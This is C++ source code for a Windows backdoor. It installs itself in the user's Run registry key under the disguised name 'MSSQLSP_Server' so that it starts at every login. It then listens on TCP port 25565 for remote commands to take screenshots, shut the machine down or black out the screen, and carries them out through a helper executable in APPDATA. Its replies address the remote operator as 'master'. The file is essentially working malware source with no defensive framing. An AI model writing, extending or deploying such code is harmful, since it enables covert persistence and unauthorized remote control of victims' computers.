#include <stdio.h>
#include <iostream>
#include <winsock2.h>
#include <string>
#include <windows.h>
#include <winuser.h>

#pragma comment(lib,"ws2_32.lib")

using namespace std;

#define RUN_KEY_ADMIN "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
#define RUN_KEY "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"

int addRunEntry(char *name, char *path)
{
    HKEY key;
    int len = strlen(path) + 1;
    //LONG r = RegOpenKeyEx(HKEY_LOCAL_MACHINE, RUN_KEY, 0, KEY_ALL_ACCESS, &key);
	LONG r = RegOpenKeyEx(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_ALL_ACCESS, &key);

    if (r != ERROR_SUCCESS) {
        // unable to open key for adding values.
        return 1;
    }
 
    r = RegSetValueEx(key, name, 0, REG_SZ, (BYTE *)path, len);
    if (r != ERROR_SUCCESS) {
        RegCloseKey(key);
        // unable to change registry value.
        return 1;
    }
         
    RegCloseKey(key);
 
    // success
    return 0; 
}

void loader(char szExe[], char szArgs[])
{
    STARTUPINFO          si = { sizeof(si) };
    PROCESS_INFORMATION  pi;

    if(CreateProcessA(szExe, szArgs, 0, 0, FALSE, 0, 0, 0, LPSTARTUPINFOA(&si), &pi))
    {
        // optionally wait for process to finish
        //WaitForSingleObject(pi.hProcess, INFINITE);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

int WINAPI WinMain(HINSTANCE inst,HINSTANCE prev,LPSTR cmd,int show){
	//registry autorun
	char result[260];
	string( result, GetModuleFileName(NULL, result, 260));
	string try1 = (string)result;
	string try2 = "\""+try1+"\"";
	char *result2 = (char*)try2.c_str();
	addRunEntry("MSSQLSP_Server", result2);

	bool running = true;
	while(running){
		WSADATA WsaDat;
		if(WSAStartup(MAKEWORD(2,2),&WsaDat)!=0)
		{
			std::cout<<"WSA Initialization failed!\r\n";
			WSACleanup();
			system("PAUSE");
			return 0;
		}
	
		SOCKET Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
		if(Socket==INVALID_SOCKET)
		{
			std::cout<<"Socket creation failed.\r\n";
			WSACleanup();
			system("PAUSE");
			return 0;
		}
	
		SOCKADDR_IN serverInf;
		serverInf.sin_family=AF_INET;
		serverInf.sin_addr.s_addr=INADDR_ANY;
		serverInf.sin_port=htons(25565);

		if(bind(Socket,(SOCKADDR*)(&serverInf),sizeof(serverInf))==SOCKET_ERROR)
		{
			std::cout<<"Unable to bind socket!\r\n";
			WSACleanup();
			system("PAUSE");
			return 0;
		}

		listen(Socket,1);

		SOCKET TempSock=SOCKET_ERROR;
		while(TempSock==SOCKET_ERROR)
		{
			std::cout<<"Waiting for incoming connections...\r\n";
			TempSock=accept(Socket,NULL,NULL);
		}
		Socket=TempSock;

		std::cout<<"Client connected!\r\n\r\n";

		char *szMessage="Welcome to the server! Use SCREENSHOT or SHUTDOWN or BLACKSCREEN\r\n";
		send(Socket,szMessage,strlen(szMessage),0);

		//
		char buffer[1024] = {'\0'};
		std::string message;
		int s = recv(Socket, buffer, 1024, 0);
		/*cout << "outgoing MESSAGE: ";
		cin >> message;
		send(Socket, message.c_str(), message.length(), 0);*/
		message = (string)buffer;
		cout << message;
		if (std::string::npos != message.find("SCREENSHOT"))
		{
			char* appdata = getenv("APPDATA");
			string asdf = (string)appdata + "\\Server_actions.exe";
			char * ddd = &asdf[0];
			loader(ddd, " SCREENSHOT");
			string backstr = "it's up to you, master.. Screenes may be cool!";
			send(Socket, backstr.c_str(), backstr.length(), 0);
		}else if(std::string::npos != message.find("SHUTDOWN")){
			//shutdown the pc
			//restart app
			char* appdata = getenv("APPDATA");
			string asdf = (string)appdata + "\\Server_actions.exe";
			char * ddd = &asdf[0];
			loader(ddd, " SHUTDOWN");
			string backstr = "Shutting down..";
			send(Socket, backstr.c_str(), backstr.length(), 0);
			return 0;
		}else if(std::string::npos != message.find("BLACKSCREEN")){
			//black screen
			//restart app
			char* appdata = getenv("APPDATA");
			string asdf = (string)appdata + "\\Server_actions.exe";
			char * ddd = &asdf[0];
			loader(ddd, " BLACKSCREEN");
			string backstr = "it's up to you, master.. Having fun on a black desktop :)";
			send(Socket, backstr.c_str(), backstr.length(), 0);
		}

		// Shutdown our socket
		shutdown(Socket,SD_SEND);

		// Close our socket entirely
		closesocket(Socket);

		// Cleanup Winsock
		WSACleanup();
	}
	
	system("PAUSE");
	return 0;
}
